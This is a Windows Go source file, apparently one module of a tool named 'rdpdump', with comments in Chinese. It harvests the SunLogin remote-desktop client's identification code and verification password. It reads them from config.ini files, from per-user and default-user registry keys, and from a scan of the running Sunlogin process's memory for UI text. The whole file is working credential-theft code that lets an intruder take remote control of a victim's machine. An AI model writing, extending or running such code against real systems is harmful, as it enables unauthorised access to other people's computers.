//go:build windows

package rdpdump

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// SunLogin 读取向日葵识别码与验证码
//
// 读取顺序：配置文件（旧版明文）→ 注册表（安装版/便携版）→ 进程内存（V11+/V12）
func SunLogin(hintDir string) Info {
	info := Info{}

	for _, path := range sunLoginConfigPaths(hintDir) {
		values := readINI(path)
		if info.Code == "" {
			info.Code = extractDigits([]byte(firstNonEmpty(
				values["fastcode"], values["clientid"], values["client_id"], values["sunlogin.clientid"])))
		}
		if info.Password == "" {
			candidate := firstNonEmpty(
				values["encry_pwd"], values["verifycode"], values["verify_code"], values["pwd"], values["password"])
			if validToken(candidate) {
				info.Password = candidate
			}
		}
		if info.Version == "" {
			info.Version = values["full_version"]
		}
	}

	// 注册表：新版把识别码/加密验证码放在 SunloginInfo / SunloginGreenInfo
	for _, root := range []registry.Key{registry.CURRENT_USER, registry.USERS} {
		for _, path := range sunLoginRegistryPaths() {
			values := readRegistryStrings(root, path)
			if len(values) == 0 {
				continue
			}
			if info.Code == "" {
				info.Code = extractDigits([]byte(firstNonEmpty(values["fastcode"], values["clientid"])))
			}
			if info.Password == "" {
				candidate := firstNonEmpty(values["encry_pwd"], values["verifycode"], values["pwd"])
				if validToken(candidate) {
					info.Password = candidate
				}
			}
		}
	}

	// 内存：V12 便携版界面文本
	if info.Code == "" || info.Password == "" {
		if pid := findProcessPID("Sunlogin.exe", "SunloginClient.exe", "SunloginClientPe.exe", "SunloginClientCore.exe"); pid != 0 {
			code, password := scanSunLoginMemory(pid)
			if info.Code == "" {
				info.Code = code
			}
			if info.Password == "" {
				info.Password = password
			}
		}
	}

	return info
}

// sunLoginConfigPaths 向日葵配置文件候选路径
func sunLoginConfigPaths(hintDir string) []string {
	paths := make([]string, 0, 6)

	if hintDir != "" {
		paths = append(paths, filepath.Join(hintDir, "config.ini"))
	}
	if programData := os.Getenv("ProgramData"); programData != "" {
		paths = append(paths, filepath.Join(programData, "Oray", "SunloginClient", "config.ini"))
	}
	for _, dir := range programDirs() {
		paths = append(paths, filepath.Join(dir, "Oray", "SunLogin", "SunloginClient", "config.ini"))
	}

	return dedupePaths(paths)
}

// sunLoginRegistryPaths 向日葵注册表候选路径
func sunLoginRegistryPaths() []string {
	return []string{
		`Software\Oray\SunLogin\SunloginClient\SunloginInfo`,
		`Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo`,
		`.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo`,
		`.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo`,
	}
}

// sunLoginMarkups 向日葵界面文本标记（不同版本字号不同）
var sunLoginMarkups = [][]byte{
	[]byte("<f f=yahei.bold.24 c=color_edit >"),
	[]byte("<f f=yahei.28 c=color_edit >"),
	[]byte("<f f=yahei.bold.20 c=color_edit >"),
	[]byte("<f f=yahei.24 c=color_edit >"),
}

// scanSunLoginMemory 扫描向日葵进程内存
func scanSunLoginMemory(pid uint32) (string, string) {
	code := ""
	password := ""

	fastcodeNeedle := []byte(`fastcode" : "`)

	scanProcess(pid, func(buffer []byte) bool {
		if code == "" {
			if index := bytes.Index(buffer, fastcodeNeedle); index >= 0 {
				segment := buffer[index+len(fastcodeNeedle):]
				limit := len(segment)
				if limit > 24 {
					limit = 24
				}
				if digits := extractDigits(segment[:limit]); len(digits) >= 6 {
					code = digits
				}
			}
		}

		if password == "" {
			for _, markup := range sunLoginMarkups {
				index := bytes.Index(buffer, markup)
				if index < 0 {
					continue
				}
				rest := buffer[index+len(markup):]
				end := bytes.Index(rest, []byte("</f>"))
				if end <= 0 || end > 64 {
					continue
				}
				candidate := strings.TrimSpace(string(rest[:end]))
				if strings.Contains(candidate, "..") || strings.Contains(candidate, "----") {
					continue
				}
				if validToken(candidate) {
					password = candidate
					break
				}
			}
		}

		return code != "" && password != ""
	})

	return code, password
}
